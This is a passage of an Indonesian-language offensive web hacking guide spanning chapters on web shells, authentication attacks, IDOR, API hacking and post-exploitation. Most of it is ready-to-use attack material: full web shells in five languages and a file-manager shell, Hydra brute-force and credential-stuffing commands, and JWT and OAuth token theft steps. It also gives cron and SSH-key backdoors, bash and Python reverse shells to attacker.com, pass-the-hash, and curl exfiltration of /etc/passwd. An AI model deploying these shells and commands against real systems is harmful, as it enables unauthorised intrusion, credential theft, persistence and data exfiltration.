    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
} elseif (isset($_POST['cmd'])) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
} else {
    echo '<form method="GET"><input type="text" name="cmd" autofocus><input type="submit" value="Execute"></form>';
}
?>
```
**Cara Pakai:**
```
http://target.com/uploads/shell.php?cmd=id
```

---
##### **🔹 ASP Web Shell**
**File: `shell.asp`**
```asp
<%
If Request.QueryString("cmd") <> "" Then
    Response.Write "<pre>" & Server.Execute(Request.QueryString("cmd")) & "</pre>"
Else
    Response.Write "<form method=""GET""><input type=""text"" name=""cmd"" autofocus><input type=""submit"" value=""Execute""></form>"
End If
%>
```
**Cara Pakai:**
```
http://target.com/uploads/shell.asp?cmd=whoami
```

---
##### **🔹 JSP Web Shell**
**File: `shell.jsp`**
```jsp
<%@ page import="java.io.*" %>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    byte[] buffer = new byte[1024];
    int len;
    while ((len = in.read(buffer)) != -1) {
        out.write(new String(buffer, 0, len));
    }
}
%>
<form method="GET">
    <input type="text" name="cmd" autofocus>
    <input type="submit" value="Execute">
</form>
```
**Cara Pakai:**
```
http://target.com/uploads/shell.jsp?cmd=id
```

---
##### **🔹 Python Web Shell**
**File: `shell.py`**
```python
import os
import cgi

print("Content-Type: text/html\n")

if 'cmd' in cgi.FieldStorage():
    cmd = cgi.FieldStorage()['cmd'].value
    os.system(cmd)
else:
    print('<form method="GET"><input type="text" name="cmd" autofocus><input type="submit" value="Execute"></form>')
```
**Cara Pakai:**
```
http://target.com/uploads/shell.py?cmd=id
```

---
##### **🔹 Node.js Web Shell**
**File: `shell.js`**
```javascript
const http = require('http');
const { exec } = require('child_process');

http.createServer((req, res) => {
    if (req.url.includes('?cmd=')) {
        const cmd = req.url.split('?cmd=')[1];
        exec(cmd, (error, stdout, stderr) => {
            res.end(stdout || stderr || error);
        });
    } else {
        res.end('<form method="GET"><input type="text" name="cmd" autofocus><input type="submit" value="Execute"></form>');
    }
}).listen(8080);
```
**Cara Pakai:**
```
http://target.com:8080/shell.js?cmd=id
```

---
##### **🔹 Web Shell with File Manager**
**File: `file_manager.php`**
```php
<?php
if (isset($_GET['action']) && isset($_GET['file'])) {
    $action = $_GET['action'];
    $file = $_GET['file'];

    if ($action === 'read') {
        echo file_get_contents($file);
    } elseif ($action === 'write') {
        file_put_contents($file, $_GET['content']);
        echo "File written!";
    } elseif ($action === 'delete') {
        unlink($file);
        echo "File deleted!";
    } elseif ($action === 'exec') {
        echo shell_exec($_GET['cmd']);
    }
} else {
    echo '
    <form method="GET">
        <input type="text" name="file" placeholder="File path">
        <select name="action">
            <option value="read">Read</option>
            <option value="write">Write</option>
            <option value="delete">Delete</option>
            <option value="exec">Execute Command</option>
        </select>
        <input type="text" name="content" placeholder="Content (for write)">
        <input type="text" name="cmd" placeholder="Command (for exec)">
        <input type="submit" value="Submit">
    </form>
    ';
}
?>
```
**Cara Pakai:**
```
http://target.com/uploads/file_manager.php?action=read&file=/etc/passwd
http://target.com/uploads/file_manager.php?action=exec&cmd=id
```

---
#### **📌 Automasi dengan Burp Suite**
1. **Intercept upload request** dengan Burp Suite.
2. **Kirim ke Repeater**.
3. **Ubah file** ke web shell.
4. **Modify headers** (Content-Type, dll).
5. **Forward request** → jika file **berhasil di-upload**, maka **vulnerable**.

---
---
---

## **🔹 BAB 8: AUTHENTICATION ATTACKS**

---

### **Brute Force Attack**
**Tujuan:** Mencoba **semua kombinasi username & password** hingga menemukan yang benar.

---
#### **📌 Hydra (Brute Force Tool)**
```bash
# HTTP POST Form
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"

# SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh

# FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100

# RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.100

# SMTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt smtp://192.168.1.100
```

**Options Hydra:**
| Option | Deskripsi |
|--------|-----------|
| `-l USER` | Username |
| `-L FILE` | List username |
| `-p PASS` | Password |
| `-P FILE` | List password |
| `-s PORT` | Port |
| `-S` | SSL/TLS |
| `-t THREADS` | Jumlah thread |
| `-vV` | Verbose mode |
| `-e ns` | Coba password kosong + username sebagai password |

---
#### **📌 Medusa (Alternatif Hydra)**
```bash
medusa -h 192.168.1.100 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m FORM:/login -m DENY:"invalid"
```

---
#### **📌 John the Ripper (Password Cracking)**
```bash
# Crack hash MD5
john --format=raw-md5 hash.txt

# Crack hash SHA1
john --format=raw-sha1 hash.txt

# Crack Linux shadow file
unshadow /etc/passwd /etc/shadow > shadow.txt
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt

# Show cracked passwords
john --show shadow.txt
```

---
#### **📌 Hashcat (GPU Password Cracking)**
```bash
# Crack MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Crack SHA1
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt

# Crack WPA2 (handshake)
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt

# Crack NTLM
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

**Hashcat Modes:**
| Mode | Hash Type |
|------|-----------|
| `0` | MD5 |
| `10` | md5($pass.$salt) |
| `20` | md5($salt.$pass) |
| `100` | SHA1 |
| `110` | sha1($pass.$salt) |
| `120` | sha1($salt.$pass) |
| `22000` | WPA-PBKDF2 |
| `1000` | NTLM |
| `1800` | sha512crypt |

---
### **Credential Stuffing**
**Tujuan:** Mencoba **kombinasi username & password yang bocor** (dari data breach) di website target.

---
#### **📌 Tools Credential Stuffing**
| Tool | Deskripsi | Link |
|------|-----------|------|
| **Have I Been Pwned** | Cek apakah email/password bocor | [haveibeenpwned.com](https://haveibeenpwned.com) |
| **DeHashed** | Database password bocor | [dehashed.com](https://www.dehashed.com) |
| **Hashes.org** | Crack hash online | [hashes.org](https://hashes.org) |
| **LeakedSource** | Database password bocor | [leakedsource.com](https://www.leakedsource.com) |

---
#### **📌 Automasi Credential Stuffing**
```bash
# Download wordlist dari DeHashed
wget https://dehashed.com/download/emails.txt
wget https://dehashed.com/download/passwords.txt

# Gunakan Hydra
hydra -L emails.txt -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"
```

---
### **Password Spraying**
**Tujuan:** Mencoba **password yang sama** (contoh: `Password123!`) ke **semua username**.

---
#### **📌 Password Spraying dengan Hydra**
```bash
# Spray password "Password123!" ke semua user
hydra -L users.txt -p "Password123!" target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid" -t 4
```

---
#### **📌 Password Spraying dengan Spray**
```bash
# Install Spray
git clone https://github.com/Greenwolf/social_mapper
cd social_mapper
pip install -r requirements.txt

# Gunakan Spray
python3 spray.py -u users.txt -p passwords.txt -t target.com
```

---
### **Session Hijacking**
**Tujuan:** **Mencuri session** korban untuk **login sebagai mereka**.

---
#### **📌 Session Fixation**
**Konsep:** Memaksa korban **menggunakan session ID attacker**.

**Langkah:**
1. **Attacker login** → mendapatkan `SessionID=ABC123`.
2. **Kirim link dengan SessionID** ke korban:
   ```
   http://target.com/login?session=ABC123
   ```
3. **Korban login** → **SessionID=ABC123** tetap digunakan.
4. **Attacker bisa login** dengan `SessionID=ABC123`.

---
#### **📌 Session Sidejacking**
**Konsep:** Mencuri **session cookie** korban via **MITM (Man-in-The-Middle)**.

**Tools:**
- **Bettercap**
- **Wireshark**
- **Ettercap**

**Cara Pakai Bettercap:**
```bash
bettercap -iface wlan0
set arp.spoof.targets 192.168.1.100
arp.spoof on
net.sniff on
set net.sniff.filter "tcp and (port 80 or port 443)"
```

---
#### **📌 Cookie Theft (XSS)**
Lihat Bab 4 - XSS untuk Steal Cookie.

---
### **Token Theft**
**Tujuan:** Mencuri **token autentikasi** (JWT, OAuth, API keys, dll) untuk **akses tanpa password**.

---
#### **📌 JWT Attacks**
**JWT (JSON Web Token)** adalah **token autentikasi** yang sering digunakan dalam API.

**Struktur JWT:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```
- **Header**: Algoritma (`HMAC-SHA256`, `RSA`, dll)
- **Payload**: Data (username, expiry, dll)
- **Signature**: Hash header + payload + secret key

**Serangan JWT:**
| Serangan | Deskripsi | Contoh |
|----------|-----------|--------|
| **None Algorithm** | Ubah `alg` ke `none` | `eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.` |
| **Algorithm Confusion** | Ubah algoritma dari `HS256` ke `RS256` | Gunakan public key attacker |
| **Weak Secret** | Crack secret key | `hashcat -m 16500 jwt.txt rockyou.txt` |
| **JWT Editing** | Ubah payload (contoh: `isAdmin: true`) | Decode → Edit → Re-sign |
| **JWT Brute Force** | Coba semua secret key | `jwt_tool.py brute jwt.txt` |

**Tools:**
- [jwt_tool](https://github.com/ticarpi/jwt_tool)
- [Burp JWT Editor](https://portswigger.net/bappstore/43d8714798b848998465201556854641)

---
#### **📌 OAuth Misconfigurations**
**OAuth** adalah **protokol autentikasi** yang memungkinkan akses ke resource tanpa share password.

**Kerentanan Umum:**
1. **Missing State Parameter** → CSRF.
2. **Weak Redirect URI** → Open redirect.
3. **Token Leakage** → Token ter-expose di URL/logs.
4. **Insecure Token Storage** → Token disimpan di localStorage (bisa dicuri via XSS).

**Exploitasi:**
1. **Temukan OAuth endpoint**:
   ```
   https://target.com/oauth/authorize?client_id=CLIENT_ID&redirect_uri=REDIRECT_URI&response_type=code
   ```
2. **Ganti `redirect_uri`** ke attacker:
   ```
   https://target.com/oauth/authorize?client_id=CLIENT_ID&redirect_uri=http://attacker.com&response_type=code
   ```
3. **Korban login** → **Authorization Code** dikirim ke attacker.
4. **Tukar code dengan token** (menggunakan `client_secret`):
   ```bash
   curl -X POST https://target.com/oauth/token \
     -d "grant_type=authorization_code" \
     -d "code=AUTHORIZATION_CODE" \
     -d "client_id=CLIENT_ID" \
     -d "client_secret=CLIENT_SECRET" \
     -d "redirect_uri=http://attacker.com"
   ```
5. **Gunakan token** untuk akses API.

---
### **Bypass Authentication**
---
#### **📌 IDOR (Insecure Direct Object Reference)**
**Pengertian:** Kerentanan yang memungkinkan attacker **mengakses data milik user lain** dengan **mengubah parameter** (ID, UUID, dll).

**Contoh Rentan:**
```
http://target.com/profile?user_id=123
```
- Jika attacker ubah `user_id=123` ke `user_id=124`, dan **data user 124 muncul**, maka **vulnerable**.

**Deteksi:**
1. **Coba ubah parameter** (ID, UUID, username, dll).
2. **Cek apakah data user lain muncul**.

**Exploitasi:**
```
http://target.com/profile?user_id=1  # Data user 1
http://target.com/profile?user_id=2  # Data user 2
```

**Automasi dengan Burp Suite:**
1. **Intercept request** ke `/profile?user_id=123`.
2. **Kirim ke Repeater**.
3. **Ubah `user_id`** ke `124`, `125`, dst.
4. **Lihat response** → jika data berbeda, maka **vulnerable**.

**Tools:**
- [Burp Suite](https://portswigger.net/burp)
- [OWASP ZAP](https://www.zaproxy.org/)
- [IDOR Hunter](https://github.com/nahamsec/idor-hunter)

---
#### **📌 Bypass IDOR Protection**
| Teknik | Deskripsi | Contoh |
|--------|-----------|--------|
| **Parameter Tampering** | Ubah parameter ID | `user_id=123` → `user_id=124` |
| **HTTP Method Change** | Ganti GET ke POST/PUT | `GET /profile?user_id=124` → `POST /profile` |
| **Header Manipulation** | Ubah header (contoh: `X-User-ID`) | `X-User-ID: 124` |
| **JSON Parameter Pollution** | Tambah parameter JSON | `{"user_id": 123, "user_id": 124}` |
| **Path Traversal** | Ubah path | `/profile/123` → `/profile/124` |
| **UUID Prediction** | Prediksi UUID berikutnya | `user_id=550e8400-e29b-41d4-a716-446655440000` → `user_id=550e8400-e29b-41d4-a716-446655440001` |

---
#### **📌 JWT Attacks (Lebih Detail)**
**Tools:**
- [jwt_tool](https://github.com/ticarpi/jwt_tool)
- [Burp JWT Editor](https://portswigger.net/bappstore/43d8714798b848998465201556854641)

**Cara Pakai jwt_tool:**
```bash
# Check JWT
python3 jwt_tool.py JWT_TOKEN -X i

# Crack secret (brute force)
python3 jwt_tool.py JWT_TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Change algorithm to none
python3 jwt_tool.py JWT_TOKEN -X a -C -n

# Edit payload (contoh: ubah isAdmin=true)
python3 jwt_tool.py JWT_TOKEN -X e -C -cl "isAdmin:true"
```

---
#### **📌 OAUTH Misconfigurations (Lebih Detail)**
**Tools:**
- [OAuth 2.0 Playground](https://developers.google.com/oauthplayground/)
- [Burp Suite OAuth Testing](https://portswigger.net/burp/documentation/desktop/tools/sequencer)

**Cara Exploit:**
1. **Temukan OAuth endpoint**:
   ```bash
   grep -r "oauth" /var/www/html/
   ```
2. **Ganti `redirect_uri`** ke attacker:
   ```
   https://target.com/oauth/authorize?client_id=CLIENT_ID&redirect_uri=http://attacker.com&response_type=code
   ```
3. **Korban login** → **Authorization Code** dikirim ke attacker.
4. **Tukar code dengan token**.

**Tools untuk Automasi:**
- [OAuth 2.0 Testing Playground](https://oauthdebugger.com/)
- [Burp OAuth Testing](https://portswigger.net/burp/documentation/desktop/tools/sequencer/oauth-testing)

---
---
---

## **🔹 BAB 9: INSECURE DIRECT OBJECT REFERENCES (IDOR) LANJUTAN**

---

### **Pengertian IDOR**
Insecure Direct Object Reference (IDOR) adalah **kerentanan yang memungkinkan attacker untuk mengakses data milik user lain** dengan **mengubah parameter referensi** (ID, UUID, filename, dll). Hal ini terjadi karena **server tidak memvalidasi apakah user berhak mengakses object tersebut**.

---
### **Deteksi IDOR**
---
#### **📌 Manual Detection**
1. **Coba ubah parameter** (ID, UUID, username, dll) di URL, form, atau API.
   - Contoh:
     ```
     http://target.com/profile?user_id=123 → http://target.com/profile?user_id=124
     ```
2. **Cek apakah data user lain muncul**.
3. **Coba dengan API**:
   ```bash
   curl -H "Authorization: Bearer TOKEN" http://target.com/api/users/123
   curl -H "Authorization: Bearer TOKEN" http://target.com/api/users/124
   ```

---
#### **📌 Automated Detection (Burp Suite)**
1. **Intercept request** ke endpoint yang menggunakan ID (contoh: `/profile?user_id=123`).
2. **Kirim ke Repeater**.
3. **Ubah ID** ke nilai lain (contoh: `124`).
4. **Lihat response** → jika data berbeda, maka **vulnerable**.

---
#### **📌 Automated Detection (IDOR Hunter)**
```bash
# Install IDOR Hunter
git clone https://github.com/nahamsec/idor-hunter
cd idor-hunter
go build

# Scan website
./idor-hunter -u http://target.com -d 3 -c 10
```
- `-u`: URL target.
- `-d`: Depth (berapa banyak parameter yang dicoba).
- `-c`: Concurrent requests.

---
### **Exploitasi IDOR**
---
#### **📌 Exploitasi di URL**
**Contoh:**
```
http://target.com/profile?user_id=123  # Data user 123
http://target.com/profile?user_id=124  # Data user 124
```

---
#### **📌 Exploitasi di API**
**Contoh Request:**
```http
GET /api/users/123 HTTP/1.1
Host: target.com
Authorization: Bearer USER_TOKEN
```
**Exploit:**
```http
GET /api/users/124 HTTP/1.1
Host: target.com
Authorization: Bearer USER_TOKEN
```
- Jika **response berisi data user 124**, maka **vulnerable**.

---
#### **📌 Exploitasi dengan JSON Parameter Pollution**
**Konsep:** Beberapa API **menggunakan parameter terakhir** jika ada duplikasi.

**Contoh Request:**
```json
{
  "user_id": 123,
  "user_id": 124
}
```
- Jika API menggunakan **parameter terakhir**, maka **user_id=124** yang diproses.

---
#### **📌 Exploitasi dengan HTTP Method Change**
**Konsep:** Beberapa endpoint **hanya memeriksa method GET**, tetapi **mengizinkan POST/PUT untuk mengubah data**.

**Contoh:**
```http
GET /api/users/123 HTTP/1.1  # Hanya baca
POST /api/users/123 HTTP/1.1 # Bisa ubah data
```

---
#### **📌 Exploitasi dengan Header Manipulation**
**Konsep:** Beberapa API **menggunakan header** (contoh: `X-User-ID`) untuk identifikasi user.

**Contoh:**
```http
GET /api/profile HTTP/1.1
Host: target.com
X-User-ID: 123
```
**Exploit:**
```http
GET /api/profile HTTP/1.1
Host: target.com
X-User-ID: 124
```

---
#### **📌 Exploitasi dengan Path Traversal**
**Konsep:** Ubah **path** untuk mengakses object lain.

**Contoh:**
```
http://target.com/profile/123  # Data user 123
http://target.com/profile/124  # Data user 124
```

---
### **Automasi dengan Burp Suite**
1. **Intercept request** ke endpoint yang menggunakan ID.
2. **Kirim ke Repeater**.
3. **Ubah ID** ke nilai lain.
4. **Lihat response** → jika data berbeda, maka **vulnerable**.
5. **Gunakan Intruder** untuk **brute force ID**:
   - **Payload Type**: Numbers.
   - **Range**: 1-1000.

---
### **Bypass IDOR Protection**
---
#### **📌 Bypass dengan Parameter Tampering**
**Teknik:** Ubah parameter ID ke nilai yang tidak valid (contoh: `0`, `-1`, `admin`).

**Contoh:**
```
http://target.com/profile?user_id=0
http://target.com/profile?user_id=-1
http://target.com/profile?user_id=admin
```

---
#### **📌 Bypass dengan HTTP Method Change**
**Teknik:** Ganti **HTTP method** (GET → POST/PUT/DELETE).

**Contoh:**
```http
GET /api/users/123 HTTP/1.1  # Hanya baca
POST /api/users/123 HTTP/1.1 # Bisa ubah/hapus
DELETE /api/users/123 HTTP/1.1 # Hapus data
```

---
#### **📌 Bypass dengan Header Manipulation**
**Teknik:** Ubah **header** yang digunakan untuk autentikasi (contoh: `X-User-ID`, `X-API-Key`).

**Contoh:**
```http
GET /api/profile HTTP/1.1
X-User-ID: 123
```
**Exploit:**
```http
GET /api/profile HTTP/1.1
X-User-ID: 124
```

---
#### **📌 Bypass dengan JSON Parameter Pollution**
**Teknik:** Tambahkan **parameter duplikasi** dalam JSON.

**Contoh:**
```json
{
  "user_id": 123,
  "user_id": 124
}
```
- Jika API menggunakan **parameter terakhir**, maka **user_id=124** yang diproses.

---
#### **📌 Bypass dengan Path Traversal**
**Teknik:** Ubah **path** untuk mengakses object lain.

**Contoh:**
```
http://target.com/profile/123  # Data user 123
http://target.com/profile/../124  # Data user 124 (path traversal)
```

---
#### **📌 Bypass dengan UUID Prediction**
**Teknik:** Prediksi **UUID berikutnya** (jika menggunakan sequential UUID).

**Contoh:**
- `user_id=550e8400-e29b-41d4-a716-446655440000` (User 1)
- `user_id=550e8400-e29b-41d4-a716-446655440001` (User 2)

**Tools:**
- [UUID Predictor](https://github.com/nahamsec/uuid-predictor)

---
---
---

## **🔹 BAB 10: API HACKING LANJUTAN**

---

### **Pengertian API Hacking**
API (Application Programming Interface) adalah **antarmuka yang memungkinkan aplikasi berkomunikasi**. API Hacking adalah **mengeksploitasi kerentanan dalam API** untuk mendapatkan akses tidak sah, mencuri data, atau mengganggu layanan.

---
### **Deteksi API Vulnerabilities**
---
#### **📌 Manual Detection**
1. **Cari endpoint API**:
   - `/api/`, `/graphql`, `/rest/`, `/v1/`, `/v2/`
   - Cek **JavaScript files** (biasanya berisi endpoint API).
   - Cek **mobile apps** (APK/IPA bisa di-decompile untuk melihat API calls).
2. **Coba akses endpoint** tanpa autentikasi:
   ```bash
   curl http://target.com/api/users
   ```
3. **Coba ubah parameter**:
   ```bash
   curl http://target.com/api/users/1
   curl http://target.com/api/users/2
   ```
4. **Coba method lain** (GET, POST, PUT, DELETE, PATCH).

---
#### **📌 Automated Detection (OWASP ZAP)**
1. **Scan dengan OWASP ZAP**:
   ```bash
   zap-baseline.py -t http://target.com
   ```
2. **Lihat hasil scan** → cek kerentanan API.

---
#### **📌 Automated Detection (Postman)**
1. **Import API collection** (jika tersedia).
2. **Run automated tests** (Postman memiliki built-in security tests).

---
### **Exploitasi API**
---
#### **📌 BOLA (Broken Object Level Authorization)**
**Pengertian:** Kerentanan yang memungkinkan attacker **mengakses data milik user lain** karena **server tidak memvalidasi apakah user berhak mengakses object tersebut**.

**Contoh:**
```http
GET /api/users/123 HTTP/1.1
Authorization: Bearer USER_TOKEN
```
- Jika attacker ubah `123` ke `124` dan **data user 124 muncul**, maka **vulnerable**.

**Exploitasi:**
```http
GET /api/users/124 HTTP/1.1
Authorization: Bearer USER_TOKEN
```

---
#### **📌 Mass Assignment**
**Pengertian:** Kerentanan yang memungkinkan attacker **meng-set attribute yang tidak seharusnya bisa di-set** (contoh: `isAdmin: true`).

**Contoh Rentan:**
```http
POST /api/users HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@email.com",
  "isAdmin": true
}
```
- Jika `isAdmin` **bisa di-set**, maka **vulnerable**.

**Exploitasi:**
```http
PATCH /api/users/123 HTTP/1.1
Content-Type: application/json

{
  "isAdmin": true
}
```

---
#### **📌 Excessive Data Exposure**
**Pengertian:** API mengembalikan **data yang tidak seharusnya ter-expose** (contoh: password hash, internal IDs, dll).

**Contoh:**
```http
GET /api/users/123 HTTP/1.1
```
**Response:**
```json
{
  "id": 123,
  "username": "user123",
  "password": "5f4dcc3b5aa765d61d8327deb882cf99",  # MD5("password")
  "isAdmin": false
}
```
- **Password hash** seharusnya **tidak ter-expose**.

---
#### **📌 Security Misconfigurations**
**Contoh Kerentanan:**
1. **Missing Authentication** → API bisa diakses tanpa token.
2. **Weak Authentication** → Token mudah ditebak.
3. **Missing Rate Limiting** → API bisa di-brute force.
4. **Verbose Error Messages** → Error message mengungkapkan informasi internal.
5. **Missing CORS Headers** → API bisa diakses dari domain lain.

**Exploitasi:**
1. **Temukan endpoint tanpa autentikasi**:
   ```bash
   curl http://target.com/api/users
   ```
2. **Brute force token**:
   ```bash
   wfuzz -c -w /usr/share/wordlists/rockyou.txt -H "Authorization: Bearer FUZZ" http://target.com/api/users
   ```

---
#### **📌 Rate Limiting Bypass**
**Teknik Bypass:**
| Teknik | Deskripsi | Contoh |
|--------|-----------|--------|
| **IP Rotation** | Ganti IP tiap request | Gunakan proxy list |
| **Slow Requests** | Kirim request perlahan | `--delay=5` (SQLMap) |
| **Header Spoofing** | Ganti header (contoh: `X-Forwarded-For`) | `X-Forwarded-For: 1.1.1.1` |
| **Session Rotation** | Ganti session/token tiap request | Gunakan multiple accounts |
| **Distributed Attack** | Gunakan multiple IP | Botnet |

**Contoh (IP Rotation dengan Proxy):**
```bash
# List proxy
proxies = ["http://proxy1:8080", "http://proxy2:8080"]

# Gunakan proxy tiap request
for proxy in proxies:
    requests.get("http://target.com/api/users", proxies={"http": proxy, "https": proxy})
```

---
### **Tools API Hacking**
| Tool | Fungsi | Link |
|------|--------|------|
| **Postman** | API testing | [postman.com](https://www.postman.com) |
| **Burp Suite** | API scanning & exploitation | [portswigger.net/burp](https://portswigger.net/burp) |
| **OWASP ZAP** | Automated API scanning | [zaproxy.org](https://www.zaproxy.org) |
| **Insomnia** | API testing | [insomnia.rest](https://insomnia.rest) |
| **Hoppscotch** | API testing (web-based) | [hoppscotch.io](https://hoppscotch.io) |
| **Arjun** | Discover hidden HTTP parameters | [github.com/s0md3v/Arjun](https://github.com/s0md3v/Arjun) |
| **Param Miner** | Discover hidden parameters | [github.com/PortSwigger/param-miner](https://github.com/PortSwigger/param-miner) |
| **GraphQL Cop** | GraphQL vulnerability scanner | [github.com/doyensec/graphql-cop](https://github.com/doyensec/graphql-cop) |

---
### **Automasi dengan Postman & Burp Suite**
---
#### **📌 Postman Automated Testing**
1. **Import API collection**.
2. **Buka "Tests" tab**.
3. **Tambahkan script** untuk test kerentanan:
   ```javascript
   // Test BOLA
   pm.test("BOLA Vulnerability", function() {
       pm.sendRequest({
           url: pm.environment.get("base_url") + "/api/users/124",
           method: "GET",
           header: {
               "Authorization": "Bearer " + pm.environment.get("token")
           }
       }, function(err, res) {
           pm.expect(res.code).to.be.oneOf([200, 403]);
           pm.expect(res.json().id).to.eql(124);
       });
   });
   ```
4. **Run tests**.

---
#### **📌 Burp Suite API Scanning**
1. **Intercept API request** dengan Burp Suite.
2. **Kirim ke Repeater**.
3. **Ubah parameter/method**.
4. **Lihat response**.
5. **Gunakan Scanner** untuk automated vulnerability detection.

---
---
---

## **🔹 BAB 11: WEB SHELL & POST-EXPLOITATION**

---

### **Pengertian Web Shell**
Web Shell adalah **script yang memungkinkan attacker untuk mengeksekusi perintah di server** via **HTTP/HTTPS**. Web shell biasanya **di-upload ke server** melalui **file upload vulnerability** atau **RCE**.

---
### **Jenis-Jenis Web Shell**
| Jenis | Bahasa | Contoh | Fitur |
|------|---------|--------|-------|
| **PHP** | PHP | `shell.php` | Command execution, file manager |
| **ASP** | ASP | `shell.asp` | Command execution |
| **JSP** | Java | `shell.jsp` | Command execution |
| **Python** | Python | `shell.py` | Command execution |
| **Node.js** | JavaScript | `shell.js` | Command execution |
| **Perl** | Perl | `shell.pl` | Command execution |
| **Ruby** | Ruby | `shell.rb` | Command execution |
| **Web-Based** | HTML/JS | `cmd.html` | GUI-based shell |

---
### **Upload Web Shell**
---
#### **📌 Cara Upload Web Shell**
1. **Temukan File Upload Vulnerability** (lihat Bab 7).
2. **Upload Web Shell** (contoh: `shell.php`).
3. **Bypass Filter** (extension, MIME type, content).
4. **Akses Web Shell**:
   ```
   http://target.com/uploads/shell.php?cmd=id
   ```

---
#### **📌 Web Shell dengan File Manager**
**File: `file_manager.php`**
```php
<?php
if (isset($_GET['action']) && isset($_GET['file'])) {
    $action = $_GET['action'];
    $file = $_GET['file'];

    if ($action === 'read') {
        echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
    } elseif ($action === 'write') {
        file_put_contents($file, $_GET['content']);
        echo "File written!";
    } elseif ($action === 'delete') {
        unlink($file);
        echo "File deleted!";
    } elseif ($action === 'exec') {
        echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
    } elseif ($action === 'upload') {
        move_uploaded_file($_FILES['file']['tmp_name'], $_GET['file']);
        echo "File uploaded!";
    } elseif ($action === 'download') {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file);
        exit;
    }
} else {
    echo '
    <form method="GET">
        <input type="text" name="file" placeholder="File path" value="/var/www/html/">
        <select name="action">
            <option value="read">Read</option>
            <option value="write">Write</option>
            <option value="delete">Delete</option>
            <option value="exec">Execute Command</option>
            <option value="upload">Upload File</option>
            <option value="download">Download File</option>
        </select>
        <input type="text" name="content" placeholder="Content (for write)">
        <input type="text" name="cmd" placeholder="Command (for exec)">
        <input type="file" name="file" (for upload)>
        <input type="submit" value="Submit">
    </form>
    ';
}
?>
```
**Cara Pakai:**
```
# Baca file
http://target.com/uploads/file_manager.php?action=read&file=/etc/passwd

# Tulis file
http://target.com/uploads/file_manager.php?action=write&file=/tmp/backdoor.php&content=<?php system($_GET['cmd']); ?>

# Eksekusi command
http://target.com/uploads/file_manager.php?action=exec&cmd=id

# Upload file
http://target.com/uploads/file_manager.php?action=upload&file=/tmp/shell.jpg
# (Pilih file di form)

# Download file
http://target.com/uploads/file_manager.php?action=download&file=/etc/passwd
```

---
### **Post-Exploitation**
Setelah berhasil **upload web shell**, langkah selanjutnya adalah **post-exploitation**:

---
#### **📌 Maintain Access (Persistence)**
1. **Cron Job**:
   ```bash
   echo "* * * * * root /tmp/backdoor.sh" >> /etc/crontab
   ```
2. **SSH Key**:
   ```bash
   echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@machine" >> ~/.ssh/authorized_keys
   ```
3. **Web Shell**:
   - Simpan **web shell** di direktori yang **tidak terdeteksi** (contoh: `/var/www/html/404.php`).
4. **Reverse Shell**:
   ```bash
   bash -i >& /dev/tcp/attacker.com/4444 0>&1
   ```
   Atau:
   ```bash
   python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
   ```

---
#### **📌 Privilege Escalation**
1. **Cek user saat ini**:
   ```bash
   whoami
   id
   ```
2. **Cek SUID binaries**:
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```
3. **Cek sudo permissions**:
   ```bash
   sudo -l
   ```
4. **Cek kernel version**:
   ```bash
   uname -a
   ```
5. **Search exploit**:
   ```bash
   searchsploit linux kernel 5.4
   ```
6. **Run exploit**:
   ```bash
   gcc exploit.c -o exploit
   ./exploit
   ```

**Tools:**
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) (Linux)
- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) (Windows)

---
#### **📌 Lateral Movement**
1. **Scan internal network**:
   ```bash
   nmap -sV 192.168.1.0/24
   ```
2. **Brute force SSH**:
   ```bash
   hydra -L users.txt -P passwords.txt ssh://192.168.1.100
   ```
3. **Pass-the-Hash**:
   ```bash
   python3 psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 admin@192.168.1.100
   ```
4. **SMB Execution**:
   ```bash
   crackmapexec smb 192.168.1.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -X "whoami"
   ```

---
#### **📌 Data Exfiltration**
1. **Download file**:
   ```bash
   wget http://attacker.com/shell.php -O /var/www/html/shell.php
   curl http://attacker.com/shell.php -o /var/www/html/shell.php
   ```
2. **Upload file ke attacker**:
   ```bash
   curl -F "file=@/etc/passwd" http://attacker.com/upload
   ```
3. **Encode data (Base64)**:
   ```bash
   cat /etc/passwd | base64
   ```
